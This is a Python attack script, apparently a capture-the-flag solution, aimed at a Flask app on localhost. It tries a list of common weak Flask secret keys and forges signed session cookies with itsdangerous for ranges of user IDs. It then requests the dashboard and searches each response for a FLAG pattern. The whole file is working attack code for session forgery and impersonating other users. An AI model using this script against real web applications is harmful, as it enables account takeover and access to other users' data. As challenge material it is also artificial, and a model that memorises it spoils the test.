import requests
import hmac
import hashlib
import json
import base64
import re
from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignature

# Target URL
base_url = "http://127.0.0.1:32883"
dashboard_url = f"{base_url}/dashboard"

# Common Flask secret keys to try
secret_keys = [
    'dev',
    'secret',
    'development',
    'super-secret',
    'flask-secret',
    'secret-key',
    'my-secret',
    'testing',
    'test',
    'password',
    '123456',
    'admin',
    'flask',
    'key',
    'secretkey',
    'flask-session-secret',
    'change-me',
    'default',
    'insecure'
]

# User ID ranges to test
user_id_ranges = [
    range(1, 101),           # 1-100
    range(10000, 10101),     # 10000-10100
    range(10030, 10036)      # 10030-10035 (more focused)
]

def forge_flask_session(secret_key, user_id):
    """
    Forge a Flask session cookie using itsdangerous
    """
    try:
        # Flask uses URLSafeTimedSerializer by default with salt 'cookie-session'
        serializer = URLSafeTimedSerializer(
            secret_key,
            salt='cookie-session',
            signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
        )
        
        session_data = {'user_id': user_id}
        forged_cookie = serializer.dumps(session_data)
        return forged_cookie
    except Exception as e:
        print(f"[!] Error forging session: {e}")
        return None

def test_forged_session(forged_cookie, secret_key, user_id):
    """
    Test a forged session cookie against the dashboard
    """
    try:
        cookies = {'session': forged_cookie}
        response = requests.get(dashboard_url, cookies=cookies, timeout=5)
        
        # Check for flag pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        
        # Check if response is different from error
        if response.status_code != 500:
            print(f"\n[+] SUCCESS with secret_key='{secret_key}', user_id={user_id}")
            print(f"[+] Status: {response.status_code} | Length: {len(response.content)}B")
            
            if flag_match:
                print(f"[!] FLAG FOUND: {flag_match.group(0)}")
                print(f"[+] Full Response:\n{response.text}")
                return True
            else:
                # Print response even without flag to see what we got
                print(f"[+] Response preview (first 500 chars):\n{response.text[:500]}")
                
        return flag_match is not None
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Request error for user_id={user_id}: {e}")
        return False

def main():
    print("[*] Starting Flask session forging attack")
    print(f"[*] Target: {dashboard_url}")
    print(f"[*] Testing {len(secret_keys)} secret keys")
    
    flag_found = False
    
    for secret_key in secret_keys:
        if flag_found:
            break
            
        print(f"\n[*] Testing secret key: '{secret_key}'")
        
        # Test a sample user_id first to see if key works
        sample_user_id = 1
        forged_cookie = forge_flask_session(secret_key, sample_user_id)
        
        if not forged_cookie:
            continue
        
        # Quick test with sample ID
        try:
            cookies = {'session': forged_cookie}
            test_response = requests.get(dashboard_url, cookies=cookies, timeout=5)
            
            if test_response.status_code == 500:
                # 500 error likely means wrong secret key, skip to next
                print(f"  [-] Secret key '{secret_key}' returns 500 error (likely wrong key)")
                continue
            else:
                print(f"  [+] Secret key '{secret_key}' appears valid! (Status: {test_response.status_code})")
                
        except Exception as e:
            print(f"  [-] Error testing secret key '{secret_key}': {e}")
            continue
        
        # Now test all user_id ranges with this working secret key
        for user_range in user_id_ranges:
            if flag_found:
                break
                
            for user_id in user_range:
                forged_cookie = forge_flask_session(secret_key, user_id)
                
                if forged_cookie:
                    if test_forged_session(forged_cookie, secret_key, user_id):
                        flag_found = True
                        print(f"\n[!] FINAL RESULT: Flag found with secret_key='{secret_key}', user_id={user_id}")
                        break
    
    if not flag_found:
        print("\n[-] No flag found after testing all combinations")
        print("[*] Consider expanding secret key list or user_id ranges")

if __name__ == "__main__":
    main()

